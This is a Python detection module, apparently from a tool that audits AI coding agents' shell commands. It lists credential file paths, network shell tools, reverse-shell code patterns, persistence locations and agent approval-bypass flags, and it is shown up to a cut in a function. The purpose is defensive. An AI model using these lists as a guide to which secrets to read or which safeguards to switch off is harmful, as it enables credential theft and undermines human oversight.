# SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""
What a command line does that a hunter cares about, judged on the commands it runs and not on the words it holds.

`facts(command_line)` reads the line with `shell.parse` and answers, for the hunts:

- which **risky** things it does (AAH-004): download and run, decode and run, a reverse shell, persistence, erasing
  history, each with the one command that does it as evidence;
- which **destructive** things (AAH-010);
- which hosts it reaches and whether it **sends** to them or only fetches (AAH-002, AAH-003);
- which **credentials** it reads, and whether the same line carries one to the network (AAH-003);
- which **agent configuration** it writes, which MCP servers it registers, and which approval-bypass flags it
  passes (AAH-011).

Judging the parsed command is what removes the first version's two worst habits: reporting text that was only
written or searched for (a heredoc, a commit message, a `grep` pattern), and missing every spelling of an attack but
the textbook one. `fixtures/corpus/commands.jsonl` holds the labelled lines both habits were measured on.
"""

import dataclasses
import functools
import re
import urllib.parse

from . import shell

LOOPBACK = frozenset(["localhost", "127.0.0.1", "::1", "0.0.0.0", "[::1]", "host.docker.internal"])

FETCHERS = frozenset(
    ["curl", "wget", "fetch", "http", "https", "xh", "aria2c", "iwr", "irm", "invoke-webrequest", "invoke-restmethod"])
STDIN_PROGRAMS = shell.SHELLS | frozenset([
    "python", "python2", "python3", "node", "nodejs", "perl", "ruby", "php", "iex", "invoke-expression", "source", "."
])
DECODERS = frozenset(["base64", "base32", "xxd", "openssl", "uudecode"])
PASS_THROUGH = frozenset(["tee", "cat", "gunzip", "zcat", "gzip", "bunzip2", "xz", "tr", "sed", "head", "tail", "rev"])
"""Commands a payload passes through on its way down a pipe without ceasing to be the payload."""

READERS = frozenset([
    "cat",
    "head",
    "tail",
    "less",
    "more",
    "bat",
    "nl",
    "tac",
    "base64",
    "base32",
    "xxd",
    "od",
    "hexdump",
    "strings",
    "cut",
    "awk",
    "gawk",
    "sed",
    "grep",
    "egrep",
    "fgrep",
    "rg",
    "sort",
    "uniq",
    "jq",
    "yq",
    "openssl",
    "gpg",
    "tar",
    "zip",
    "7z",
    "gzip",
    "source",
    ".",
    "get-content",
    "type",
    "gc"
])
"""Commands whose output, or archive, holds the content of the files they are given."""

NETWORK_SENDERS = frozenset(["nc", "ncat", "netcat", "socat", "telnet"])
DATABASE_CLIENTS = frozenset([
    "psql",
    "mysql",
    "mariadb",
    "sqlite3",
    "sqlcmd",
    "clickhouse-client",
    "bq",
    "snowsql",
    "duckdb",
    "cockroach",
    "mongosh",
    "mongo"
])

SECRET_PATH = re.compile(
    r"(?<![\w.-])(?:~|\$HOME|\$\{HOME\}|%USERPROFILE%|\$env:USERPROFILE|/home/[^/\\\s]{1,64}|/Users/[^/\\\s]{1,64}|"
    r"[A-Za-z]:[/\\]Users[/\\][^/\\\s]{1,64}|/root)?[/\\]?(?:"
    r"\.ssh[/\\](?:id_[a-z0-9_]{1,24}|[^\s/\\]{0,128}\.pem|[a-z0-9_-]{0,32}_?(?:key|deploy)[a-z0-9_-]{0,32})|"
    r"\.aws[/\\](?:credentials|sso[/\\]cache[/\\][^\s]{1,128})|"
    r"\.config[/\\]gcloud[/\\](?:credentials\.db|application_default_credentials\.json|access_tokens\.db)|"
    r"\.azure[/\\](?:accessTokens\.json|msal_token_cache\.json)|\.kube[/\\]config|\.docker[/\\]config\.json|"
    r"\.npmrc|\.pypirc|\.git-credentials|\.netrc|\.pgpass|\.vault-token|\.config[/\\]gh[/\\]hosts\.yml|"
    r"\.claude[/\\]\.credentials\.json|\.codex[/\\]auth\.json|\.gemini[/\\]oauth_creds\.json|"
    r"\.config[/\\]github-copilot[/\\][^\s]{1,64}|\.cache[/\\]huggingface[/\\]token|\.huggingface[/\\]token|"
    r"\.env(?:\.(?!example\b|sample\b|template\b|dist\b|defaults\b|schema\b)[\w-]{1,32}){0,3}|"
    r"Library[/\\]Keychains[/\\][^\s]{1,256}|(?:Chrome|Chromium|Edge|Brave-Browser|BraveSoftware)[^\n]{0,80}[/\\]"
    r"(?:Login Data|Cookies)|[/\\]etc[/\\]shadow|[/\\]proc[/\\](?:self|\d{1,7})[/\\]environ|"
    r"[/\\]var[/\\]run[/\\]secrets[/\\]kubernetes\.io[/\\]serviceaccount[/\\]token|"
    r"[^\s/\\]{1,64}\.tfstate|terraform\.tfvars)(?![\w-])(?!\.(?:example|sample|template|dist|pub)\b)",
    re.I)
"""Files that hold credentials: keys, cloud and registry tokens, agents' own token stores, environment files,
keychains and browser stores. Either path separator; example and template files and public keys are not secrets."""

SECRET_DIRECTORY = re.compile(
    r"(?<![\w.-])(?:~|\$HOME|\$\{HOME\}|/home/[^/\s]{1,64}|/Users/[^/\s]{1,64}|/root)[/\\](?:\.ssh|\.aws|\.gnupg|"
    r"\.config[/\\]gcloud|\.azure|\.kube)[/\\]?(?:\*|cred\*)?$",
    re.I)
"""A credential store named whole, as `tar` or `scp -r` take it."""

CREDENTIAL_COMMANDS = (
    ("gh", ("auth", "token")),
    ("aws", ("configure", "export-credentials")),
    ("aws", ("sts", "get-session-token")),
    ("gcloud", ("auth", "print-access-token")),
    ("gcloud", ("auth", "print-identity-token")),
    ("az", ("account", "get-access-token")),
    ("kubectl", ("config", "view", "--raw")),
    ("security", ("find-generic-password", )),
    ("security", ("find-internet-password", )),
    ("op", ("read", )),
    ("pass", ("show", )),
    ("vault", ("kv", "get")),
    ("vault", ("read", )),
    ("git", ("credential", "fill")),
    ("doppler", ("secrets", )),
    ("heroku", ("auth:token", )),
)
"""Commands that print a credential without reading a file a path rule could name."""

AGENT_CONFIG_PATH = re.compile(
    r"(?:^|[/\\])(?:\.claude[/\\]settings(?:\.local)?\.json|\.claude\.json|\.mcp\.json|"
    r"\.cursor[/\\](?:mcp|cli-config|cli)\.json|\.cursor[/\\]rules(?:[/\\][^\s]{0,256})?|\.cursorrules|"
    r"\.vscode[/\\]mcp\.json|claude_desktop_config\.json|\.windsurfrules|\.windsurf[/\\]rules[/\\][^\s]{1,256}|"
    r"\.codeium[/\\]windsurf[/\\]mcp_config\.json|\.github[/\\]copilot-instructions\.md|"
    r"\.github[/\\]instructions[/\\][^\s]{1,256}|CLAUDE(?:\.local)?\.md|AGENTS(?:\.override)?\.md|GEMINI\.md|"
    r"\.gemini[/\\]settings\.json|\.codex[/\\]config\.toml|\.aider\.conf\.yml|\.clinerules(?:[/\\][^\s]{0,256})?|"
    r"\.roo(?:[/\\][^\s]{1,256})|\.roomodes|\.continue[/\\](?:config\.(?:json|yaml|ts)|mcpServers[/\\][^\s]{1,256})|"
    r"\.kiro[/\\](?:settings|steering)[/\\][^\s]{1,256}|opencode\.jsonc?|\.goosehints|\.config[/\\]goose[/\\]config\.yaml|"
    r"\.amazonq[/\\](?:mcp\.json|rules[/\\][^\s]{1,256})|\.junie[/\\]guidelines\.md|"
    r"\.claude[/\\](?:hooks|commands|agents|skills|rules)[/\\][^\s]{1,256})$",
    re.I)
"""Files agents read their permissions, MCP servers, hooks and standing instructions from. Letter case is not
significant: on macOS and Windows `claude.md` is `CLAUDE.md`."""

EDITOR_SETTINGS_PATH = re.compile(r"(?:^|[/\\])\.vscode[/\\]settings\.json$|[/\\]Code[/\\]User[/\\]settings\.json$",
                                  re.I)
EDITOR_AGENT_SETTING = re.compile(
    r"chat\.tools\.[\w.]{0,40}autoApprove|chat\.mcp\.|chat\.agent\.|github\.copilot\.chat\.[\w.]{0,60}(?:instructions|"
    r"autoApprove)|task\.allowAutomaticTasks|security\.workspace\.trust|terminal\.integrated\.[\w.]{0,40}autoApprove|"
    r"claudeCode\.|\"mcp\"\s{0,3}:",
    re.I)
"""An editor's settings file governs agents only where it holds one of these; a tab width does not."""

GUARDRAIL_FLAGS = ("--dangerously-skip-permissions",
                   "--dangerously-bypass-approvals-and-sandbox",
                   "--yolo",
                   "--allow-all-tools",
                   "--trust-all-tools",
                   "--yes-always")
"""Flags that mean approvals are off whichever program takes them."""

CLI_GUARDRAIL_FLAGS = {
    "codex": ("--full-auto", ),
    "gemini": ("-y", ),
    "aider": ("--yes", ),
    "cursor-agent": ("--force", "-f"),
    "copilot": ("--allow-all-paths", ),
    "amp": ("--dangerously-allow-all", ),
    "goose": (),
}
"""Flags that mean it only to the agent named: `-y` to `gemini` is not `-y` to `apt`."""

CLI_GUARDRAIL_VALUES = (("--permission-mode", "bypasspermissions"), ("--approval-mode", "yolo"),
                        ("--sandbox", "danger-full-access"), ("-s", "danger-full-access"), ("--ask-for-approval",
                                                                                            "never"), ("-a", "never"))
AGENT_CLIS = frozenset(
    ["claude", "codex", "gemini", "cursor-agent", "copilot", "goose", "amp", "opencode", "aider", "q", "kiro", "cline"])

PROFILE_FILES = frozenset(
    [".bashrc", ".zshrc", ".profile", ".bash_profile", ".zprofile", ".zshenv", ".bash_login", ".zlogin", "config.fish"])
PERSISTENCE_PATHS = (
    ("shell_profile_persistence",
     "T1546.004",
     re.compile(r"^/etc/(?:profile|bash\.bashrc|environment|zsh/[^/]{1,64}|"
                r"profile\.d/[^/]{1,128})$")),
    ("ssh_key_persistence", "T1098.004", re.compile(r"[/\\]\.ssh[/\\]authorized_keys2?$")),
    ("scheduled_persistence",
     "T1053.003",
     re.compile(r"^/etc/cron(?:tab|\.[a-z.]{1,16}/[^/]{1,128})$|"
                r"^/var/spool/cron/")),
    ("service_persistence",
     "T1543",
     re.compile(r"[/\\]\.config[/\\]systemd[/\\]user[/\\]|^/etc/systemd/system/|"
                r"[/\\]Library[/\\]Launch(?:Agents|Daemons)[/\\]|"
                r"[/\\]\.config[/\\]autostart[/\\]")),
    ("git_hook_persistence", "T1546", re.compile(r"(?:^|[/\\])\.git[/\\]hooks[/\\][a-z-]{3,32}$")),
)
"""Where a write is persistence: name, ATT&CK technique, and the path it is recognised by."""

ROOTISH = re.compile(
    r"^(?:/|~|~/|\$HOME/?|\$\{HOME\}/?|\.|\./|\.\.|\.\./|\*|\./\*|/\*|~/\*|\$HOME/\*|\.git/?|"
    r"[A-Za-z]:[/\\]?\*?|\$env:USERPROFILE(?:[/\\]\*?)?|%USERPROFILE%(?:[/\\]\*?)?|%SystemDrive%[/\\]?\*?|"
    r"[A-Za-z]:[/\\](?:Users(?:[/\\][^/\\*]{1,64})?|Windows|Program Files(?: \(x86\))?|ProgramData)(?:[/\\]\*?)?|"
    r"/(?:home|Users)/[^/*]{1,64}(?:/\*?)?|"
    r"/(?:etc|usr|var|bin|sbin|lib|lib64|boot|home|root|opt|srv|Users|System|Library|Applications)(?:/\*?)?)$",
    re.I)
"""A deletion target that is a root, a home, the working directory, everything, the repository's history or a
system directory. A build or cache directory under one of them is not."""

FIND_FILTERS = frozenset([
    "-name",
    "-iname",
    "-path",
    "-ipath",
    "-wholename",
    "-regex",
    "-iregex",
    "-mtime",
    "-mmin",
    "-atime",
    "-ctime",
    "-newer",
    "-size",
    "-empty",
    "-user",
    "-perm"
])
PROTECTED_BRANCH = re.compile(r"(?:^|[:/+])(?:main|master|trunk|develop|production|prod|release(?:[/-][\w.-]{1,40})?)$")
SQL_DESTRUCTION = re.compile(
    r"\b(?:DROP\s{1,4}(?:TABLE|DATABASE|SCHEMA)|TRUNCATE\s{1,4}(?:TABLE\s{1,4})?\w)|"
    r"\bDELETE\s{1,4}FROM\s{1,4}[\w.\"`\[\]]{1,128}\s{0,4}(?:;|$)|\bdb\.dropDatabase\(|\.drop\(\)|"
    r"\.deleteMany\(\s{0,4}\{\s{0,4}\}\s{0,4}\)",
    re.I)
"""Statements that remove a table, a schema or every row: a `DELETE` with no `WHERE` is the last of those."""

PRODUCTION_SCOPE = re.compile(r"(?i)(?:^|[^a-z])(?:prod|production|prd|live)(?:[^a-z]|$)")
SCRATCH_SCOPE = re.compile(r"(?i)(?:^|[^a-z])(?:tests?|testing|dev|devel|tmp|temp|smoke|scratch|sandbox|ci|local|"
                           r"localhost|127\.0\.0\.1|demo|e2e|fixtures?|ephemeral|preview|playground)(?:[^a-z]|$)")
"""What a destructive command names says how much it matters: the same `DROP DATABASE` is a test's teardown on
`importer_test` and an incident on `production`. Production wins where a line names both."""

KUBECTL_VALUE_OPTIONS = frozenset([
    "-n",
    "--namespace",
    "--context",
    "--kubeconfig",
    "--cluster",
    "--user",
    "-s",
    "--server",
    "--as",
    "-l",
    "--selector",
    "-f",
    "--filename",
    "-o",
    "--output",
    "--grace-period",
    "--timeout",
    "--field-selector"
])
KUBECTL_BROAD_KINDS = frozenset([
    "ns",
    "namespace",
    "namespaces",
    "pv",
    "persistentvolume",
    "persistentvolumes",
    "crd",
    "crds",
    "customresourcedefinition",
    "node",
    "nodes",
    "clusterrole",
    "clusterrolebinding"
])
KUBECTL_WORKLOAD_KINDS = frozenset([
    "deployment",
    "deployments",
    "deploy",
    "pvc",
    "persistentvolumeclaim",
    "statefulset",
    "statefulsets",
    "sts",
    "daemonset",
    "ds",
    "secret",
    "secrets",
    "service",
    "svc",
    "ingress",
    "job",
    "cronjob",
    "configmap",
    "cm"
])
CLOUD_DELETES = {
    "aws": (("ec2", "terminate-instances"), ("rds", "delete-db-instance"), ("rds", "delete-db-cluster"),
            ("dynamodb", "delete-table"), ("s3api", "delete-bucket"), ("lambda", "delete-function"), ("eks",
                                                                                                      "delete-cluster"),
            ("ecs", "delete-cluster"), ("ecs", "delete-service"), ("iam", "delete-user"), ("iam", "delete-role"),
            ("kms", "schedule-key-deletion"), ("route53", "delete-hosted-zone"), ("secretsmanager", "delete-secret"),
            ("ec2", "delete-vpc"), ("ec2", "delete-volume"), ("ec2", "delete-snapshot"), ("elasticache",
                                                                                          "delete-cache-cluster")),
    "gcloud": (("compute", "instances", "delete"), ("sql", "instances", "delete"), ("container", "clusters", "delete"),
               ("compute", "disks", "delete"), ("functions", "delete"), ("run", "services", "delete"),
               ("secrets", "delete"), ("iam", "service-accounts", "delete")),
    "az": (("vm", "delete"), ("aks", "delete"), ("sql", "db", "delete"), ("sql", "server", "delete"),
           ("storage", "account", "delete"), ("keyvault", "delete"), ("webapp", "delete")),
    "doctl": (("compute", "droplet", "delete"), ("kubernetes", "cluster", "delete"), ("databases", "delete")),
    "heroku": (("apps:destroy", ), ("pg:reset", )),
    "fly": (("apps", "destroy"), ),
    "flyctl": (("apps", "destroy"), ),
    "vercel": (("remove", ), ("rm", )),
}
"""`program -> word sequences`, found in order among a command's operands, that delete a cloud resource."""

URL = re.compile(r"(?i)\bhttps?://[^\s\"'<>)\]]{1,2048}")
HOSTLIKE = re.compile(r"^(?:[a-z0-9-]{1,63}\.){1,8}[a-z]{2,24}$", re.I)
FILE_EXTENSIONS = frozenset([
    "json",
    "txt",
    "sh",
    "py",
    "html",
    "gz",
    "tar",
    "zip",
    "log",
    "csv",
    "yml",
    "yaml",
    "md",
    "pem",
    "key",
    "crt",
    "xml",
    "js",
    "ts",
    "out",
    "tmp",
    "bak",
    "conf",
    "cfg",
    "ini",
    "sql",
    "db",
    "png",
    "jpg",
    "pdf",
    "lock",
    "toml",
    "env",
    "pub"
])
DEV_SOCKET = re.compile(r"^/dev/(?:tcp|udp)/([^/\s]{1,255})/\d{1,5}$")

CURL_VALUE_OPTIONS = frozenset([
    "-o",
    "--output",
    "-d",
    "--data",
    "--data-raw",
    "--data-binary",
    "--data-urlencode",
    "--json",
    "-H",
    "--header",
    "-F",
    "--form",
    "--form-string",
    "-T",
    "--upload-file",
    "-X",
    "--request",
    "-u",
    "--user",
    "-A",
    "--user-agent",
    "-e",
    "--referer",
    "-b",
    "--cookie",
    "-c",
    "--cookie-jar",
    "-w",
    "--write-out",
    "-x",
    "--proxy",
    "--connect-timeout",
    "-m",
    "--max-time",
    "--retry",
    "--retry-delay",
    "-K",
    "--config",
    "--cacert",
    "--cert",
    "--key",
    "-E",
    "-r",
    "--range",
    "-C",
    "--continue-at",
    "--limit-rate",
    "--resolve",
    "--max-redirs",
    "-y",
    "-Y",
    "--interface",
    "--oauth2-bearer",
    "--aws-sigv4",
    "--output-dir",
    "-D",
    "--dump-header",
    "--trace",
    "--stderr"
])
WGET_VALUE_OPTIONS = frozenset([
    "-O",
    "--output-document",
    "-o",
    "--output-file",
    "-P",
    "--directory-prefix",
    "--post-data",
    "--post-file",
    "--header",
    "-U",
    "--user-agent",
    "--user",
    "--password",
    "-t",
    "--tries",
    "-T",
    "--timeout",
    "-w",
    "--wait",
    "-e",
    "--execute",
    "--body-data",
    "--body-file",
    "--method",
    "-a",
    "-i",
    "--input-file",
    "-Q",
    "--quota"
])
SEND_OPTIONS = ("-d",
                "--data",
                "--data-raw",
                "--data-binary",
                "--data-urlencode",
                "--json",
                "-F",
                "--form",
                "--form-string",
                "-T",
                "--upload-file",
                "--post-data",
                "--post-file",
                "--body-data",
                "--body-file")

CODE_FETCH = re.compile(
    r"urlopen|urllib\.request|requests\.(?:get|post)|httpx\.|fetch\(|https?\.get|Net::HTTP|"
    r"LWP::|file_get_contents\(\s{0,3}['\"]https?|DownloadString|WebClient|Invoke-WebRequest|"
    r"Invoke-RestMethod|\biwr\b|\birm\b",
    re.I)
CODE_EXEC = re.compile(r"\bexec\(|\beval\(|subprocess|os\.system|child_process|\bsystem\(|Invoke-Expression|\biex\b",
                       re.I)
CODE_DECODE = re.compile(r"b64decode|atob\(|fromhex|base64\.decode|decode\(['\"]base64|FromBase64String", re.I)
CODE_SOCKET_SHELL = re.compile(
    r"socket[^\n]{0,400}?(?:dup2|pty\.spawn|subprocess|/bin/(?:ba)?sh|cmd\.exe)|"
    r"(?:dup2|pty\.spawn)[^\n]{0,400}?socket|fsockopen\([^\n]{0,200}?(?:exec|shell_exec|proc_open|/bin/sh)|"
    r"TCPSocket[^\n]{0,200}?(?:exec|/bin/sh|spawn)|Net\.Sockets\.TCPClient",
    re.I | re.S)
CODE_WRITE = re.compile(
    r"open\([^)\n]{0,200}['\"][wa]b?\+?['\"]|write_text\(|writeFile|json\.dump\(|Set-Content|"
    r"Out-File|\.write\(",
    re.I)
CODE_SEND = re.compile(
    r"requests\.(?:post|put)|\.sendall\(|\.send\(|urlopen\([^)\n]{0,200}data\s{0,3}=|method\s{0,3}"
    r"[:=]\s{0,3}['\"](?:POST|PUT)|-Method\s{1,3}(?:Post|Put)|\.post\(",
    re.I)


@dataclasses.dataclass(frozen=True)
class Egress:
    """A host a command reaches."""

    host: str
    sends: bool
    """Whether the command sends data there (a body, an upload, a pipe, data built into the address) or only asks."""
    evidence: str


@dataclasses.dataclass(frozen=True)
class Facts:
    """What one command line does. Every `evidence` is the single command at fault, as written, not yet defanged."""

    risky: tuple = ()
    """`(name, ATT&CK technique, evidence)`."""
    destructive: tuple = ()
    """`(name, severity, evidence)`."""
    egress: tuple = ()
    secret_reads: tuple = ()
    """`(what was read, evidence)`: a path, or a credential-printing command."""
    secret_flow: tuple = ()
    """`(what, host, evidence)` where the same line reads a credential and carries it to the network."""
    config_writes: tuple = ()
    """`(path, evidence)` for writes to, and deletions of, agent configuration."""
    mcp_registrations: tuple = ()
    guardrail_flags: tuple = ()
    """`(flag, evidence)`."""
    programs: frozenset = frozenset()
    uncertain: bool = False


def _host_of(word: str) -> str:
    """The host of a URL, a `user@host:path`, or a bare host; empty when the word is none of them."""
    word = word.strip("'\"")

    if ("://" in word):
        try:
            return (urllib.parse.urlsplit(word).hostname or "").lower()
        except ValueError:
            return ""

    candidate = word.split("@", 1)[-1].split("/", 1)[0]

    if (candidate.startswith("[") and "]" in candidate):
        return candidate[1:candidate.index("]")].lower()

    candidate = candidate.split(":", 1)[0]

    if (HOSTLIKE.match(candidate) and candidate.rsplit(".", 1)[-1].lower() not in FILE_EXTENSIONS):
        return candidate.lower()

    if (re.fullmatch(r"\d{1,3}(?:\.\d{1,3}){3}", candidate)):
        return candidate

    return ""


def _operands(command: shell.Command, value_options: frozenset) -> list:
    """The non-option words of a command, leaving out the values of the options that take one."""
    found = []
    skip = False
    ended = False

    for word in command.args:
        if (skip):
            skip = False
        elif (ended):
            found.append(word)
        elif (word == "--"):
            ended = True
        elif (word in value_options):
            skip = True
        elif (not word.startswith("-") or word == "-"):
            found.append(word)

    return found


def _data_in_address(word: str) -> bool:
    """Whether an address was built to carry data: a substitution or variable in it, or a long query value."""
    if ("$(" in word or "`" in word or re.search(r"\$\{?[A-Za-z_]", word)):
        return True

    query = urllib.parse.urlsplit(word).query if "://" in word else ""

    return any(len(value) >= 32 for values in urllib.parse.parse_qs(query).values() for value in values)


def _egress_of(command: shell.Command, piped_in: bool) -> list:  # pylint: disable=too-many-branches
    program = command.program
    found = []
    redirected = any(not DEV_SOCKET.match(source) and source != "<>" for source in command.reads)

    if (program in ("http", "https", "xh")):
        # HTTPie: an optional method, the address, then request items; a body comes from items or standard input.
        operands = _operands(command,
                             frozenset(["-a", "--auth", "-o", "--output", "--proxy", "--session", "--timeout"]))
        method = operands[0].upper() if operands and operands[0].upper() in HTTP_METHODS else ""
        address = operands[1 if method else 0:][:1]
        items = operands[(2 if method else 1):]
        sends = (method in ("POST", "PUT", "PATCH") or redirected or piped_in
                 or any(re.match(r"^[\w.-]{1,64}(?::?=@?|@)", item) for item in items))

        for word in address:
            host = _host_of(word if "://" in word or not word.startswith(":") else "localhost")

            if (host):
                found.append(Egress(host, sends or _data_in_address(word), command.raw))
    elif (program in ("curl", "wget", "aria2c", "fetch")):
        options = WGET_VALUE_OPTIONS if program == "wget" else CURL_VALUE_OPTIONS
        method = " ".join(command.value("-X", "--request", "--method")).upper()
        sends = (any(command.option(name) or command.value(name) for name in SEND_OPTIONS)
                 or method in ("POST", "PUT", "PATCH", "DELETE"))

        for word in [*_operands(command, options), *command.value("--url")]:
            host = _host_of(word)

            if (host):
                found.append(Egress(host, sends or _data_in_address(word), command.raw))
    elif (program in ("iwr", "irm", "invoke-webrequest", "invoke-restmethod")):
        lowered = [word.lower() for word in command.args]
        sends = any(word in ("-body", "-infile") for word in lowered) or any(word in ("post", "put", "patch")
                                                                             for word in lowered)

        for word in command.args:
            if ("://" in word and _host_of(word)):
                found.append(Egress(_host_of(word), sends or _data_in_address(word), command.raw))
    elif (program in NETWORK_SENDERS):
        scanning = command.option("-z")

        if (program == "socat"):
            hosts = [
                match.group(1) for word in command.args
                for match in re.finditer(r"(?i)(?:tcp|udp|ssl|openssl)[46]?(?:-connect)?:([^:,\s]{1,255}):\d", word)
            ]
        else:
            hosts = [word for word in command.operands if not word.isdigit()][:1]

        for host in hosts:
            if (not scanning):
                found.append(Egress(host.lower(), True, command.raw))
    elif (program == "ssh"):
        destination = shell._ssh_operands(command)[:1]  # pylint: disable=protected-access

        for word in destination:
            found.append(Egress(word.split("@", 1)[-1].lower(), piped_in or redirected, command.raw))
    elif (program in ("scp", "sftp", "rsync")):
        operands = _operands(
            command,
            frozenset([
                "-i",
                "-P",
                "-p",
                "-o",
                "-F",
                "-J",
                "-l",
                "-e",
                "-c",
                "-S",
                "--rsh",
                "--port",
                "--exclude",
                "--include",
                "--files-from"
            ]))
        remote = [
            (index, word) for (index, word) in enumerate(operands)
            if re.match(r"^(?:[\w.-]{1,64}@)?[\w.-]{1,255}:(?!\\)", word) and not re.match(r"^[A-Za-z]:[/\\]", word)
        ]

        for (index, word) in remote:
            uploads = index == len(operands) - 1 and len(operands) > 1
            found.append(Egress(word.split("@", 1)[-1].split(":", 1)[0].lower(), uploads, command.raw))
    elif (program == "git" and command.args[:1] == ["push"]):
        for word in command.args[1:]:
            host = _host_of(word) if ("://" in word or "@" in word) else ""

            if (host):
                found.append(Egress(host, True, command.raw))
    elif (program == "gh" and command.args[:2] == ["gist", "create"]):
        found.append(Egress("gist.github.com", True, command.raw))
    elif (program == "aws" and command.args[:1] == ["s3"] and command.args[1:2] in (["cp"], ["mv"], ["sync"])):
        operands = [word for word in command.args[2:] if not word.startswith("-")]

        if (len(operands) >= 2 and operands[-1].startswith("s3://") and not operands[0].startswith("s3://")):
            found.append(Egress(_bucket(operands[-1]) + ".s3.amazonaws.com", True, command.raw))
    elif (program in ("gsutil", "gcloud") and ("cp" in command.args or "rsync" in command.args)):
        operands = [word for word in command.args if not word.startswith("-")]

        if (len(operands) >= 2 and operands[-1].startswith("gs://") and not operands[-2].startswith("gs://")):
            found.append(Egress(_bucket(operands[-1]) + ".storage.googleapis.com", True, command.raw))
    elif (program == "rclone" and command.args[:1] in (["copy"], ["sync"], ["move"], ["copyto"])):
        operands = [word for word in command.args[1:] if not word.startswith("-")]

        if (len(operands) >= 2 and re.match(r"^[\w-]{2,64}:", operands[-1])):
            found.append(Egress(operands[-1].split(":", 1)[0].lower() + " (rclone remote)", True, command.raw))
    elif (program in ("dig", "nslookup", "host", "drill")):
        for word in command.operands:
            if ("$(" in word or "`" in word or "$" in word or any(len(label) >= 30 for label in word.split("."))):
                found.append(Egress(word.lower()[:255], True, command.raw))
    elif (command.code):
        for url in URL.findall(command.code)[:10]:
            host = _host_of(url)

            if (host):
                found.append(Egress(host, bool(CODE_SEND.search(command.code)), command.raw))

    return [item for item in found if item.host and item.host not in LOOPBACK]


HTTP_METHODS = frozenset(["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"])


def _bucket(address: str) -> str:
    return re.sub(r"[^a-z0-9.-]", "", address.split("://", 1)[-1].split("/", 1)[0].lower())[:63] or "bucket"


def _secret_operands(words: list) -> list:
    return sorted({match.group(0)
                   for word in words
                   for match in SECRET_PATH.finditer(word)}
                  | {word
                     for word in words if SECRET_DIRECTORY.match(word)})


def _secrets_read(command: shell.Command) -> list:
    """What credentials one command reads: the secret files it is given to read, or the credential it prints."""
    program = command.program
    found = _secret_operands(command.reads)

    if (program in READERS):
        operands = command.operands

        if (program == "sed" and command.option("-i")):
            operands = []

        found.extend(_secret_operands(operands))
    elif (program in ("cp", "mv", "install", "rsync", "scp", "sftp")):
        found.extend(_secret_operands(command.operands[:-1]))
    elif (program in ("curl", "wget")):
        uploads = [
            value.split("=", 1)[-1].lstrip("@<")
            for value in command.value("-d", "--data", "--data-binary", "--data-raw", "-F", "--form", "--json")
            if "@" in value or "<" in value
        ]
        uploads.extend(command.value("-T", "--upload-file", "--post-file", "--body-file"))
        found.extend(_secret_operands(uploads))
    elif (program == "gh" and command.args[:2] == ["gist", "create"]):
        found.extend(_secret_operands(command.operands[2:]))
    elif (program in ("aws", "gsutil", "gcloud", "rclone", "az")
          and any(word in ("cp", "mv", "sync", "rsync", "copy", "copyto", "upload", "upload-batch")
                  for word in command.args)):
        found.extend(_secret_operands([word for word in command.args if not word.startswith("-")][:-1]))
        found.extend(_secret_operands(command.value("--file", "-f", "--source", "-s")))
    elif (program in ("http", "https", "xh")):
        found.extend(_secret_operands([word.split("@", 1)[-1] for word in command.operands if "@" in word]))
    elif (program in ("env", "printenv") and not command.operands):
        found.append("(environment)")
    elif (command.code and re.search(r"open\(|read|Get-Content|slurp", command.code)):
        found.extend(_secret_operands([command.code]))

    for (name, words) in CREDENTIAL_COMMANDS:
        if (program == name and all(word in command.args for word in words)):
            found.append(f"({name} {' '.join(words)})")

    return sorted(set(found))


def _reads_program_from_stdin(command: shell.Command) -> bool:
    """Whether a command runs what arrives on its standard input, as `sh`, `bash -s` and `python -` do."""
    program = command.program

    if (program in shell.SHELLS):
        return not any(
            word.endswith("c") and word.startswith("-") and not word.startswith("--")
            for word in command.args) and all(word in ("-", "-s") for word in command.operands)

    if (program in ("python", "python2", "python3")):
        return not command.option("-c", "-m") and all(word in ("-", "/dev/stdin") for word in command.operands[:1])

    if (program in ("node", "nodejs", "perl", "ruby", "php")):
        return not command.operands and not command.option("-e", "-r", "-E")

    return program in ("iex", "invoke-expression")


def _targets_written(command: shell.Command) -> list:
    """Every path a command writes, replaces or deletes: redirections, and the operands that name a destination."""
    program = command.program
    found = [target for (target, _) in command.writes]

    if (program == "tee"):
        found.extend(command.operands)
    elif (program in ("cp", "mv", "install", "ln") and len(command.operands) >= 2):
        found.append(command.operands[-1])
    elif (program in ("rm", "truncate", "shred", "unlink")):
        found.extend(command.operands)
    elif (program == "sed" and (command.option("-i") or any(word.startswith("-i") for word in command.args))):
        found.extend(command.operands[1:] if not command.option("-e", "-f") else command.operands)
    elif (program == "dd"):
        found.extend(word[3:] for word in command.args if word.startswith("of="))

    return found


PROFILE_ROUTINE = re.compile(
    r"^\s{0,8}(?:#[^\n]{0,200}|(?:export\s{1,4})?PATH=[\"']?(?:\$HOME|~|\$\{HOME\}|/usr/local|/opt/homebrew|\$PATH)"
    r"[\w/.:${}\"'-]{0,200}|alias\s{1,4}[\w-]{1,32}=[^\n;|&`$]{1,120}|"
    r"export\s{1,4}(?:EDITOR|VISUAL|PAGER|LANG|LC_ALL|NVM_DIR|PYENV_ROOT|GOPATH|JAVA_HOME|BUN_INSTALL|PNPM_HOME)="
    r"[\w/.:${}\"' -]{0,160}|(?:source|\.)\s{1,4}[\"']?(?:\$HOME|~)/\.(?:cargo/env|nvm/nvm\.sh|fzf\.(?:bash|zsh)|"
    r"asdf/asdf\.sh)[\"']?|eval\s{1,4}\"\$\((?:[\w/.-]{0,64}/)?(?:pyenv|rbenv|nodenv|direnv|starship|zoxide|fnm|mise|"
    r"brew|conda)\s[\w -]{1,40}\)\")\s{0,8}$")
"""Lines an installer or a developer ordinarily adds to a shell profile: a `PATH` entry under the home directory, an
alias with nothing run inside it, a well-known tool's own initialiser. A profile write of only these is a change,
not persistence; `PATH` put ahead of the system's from a temporary directory is not among them."""


def _is_decoder(command: shell.Command) -> bool:
    program = command.program

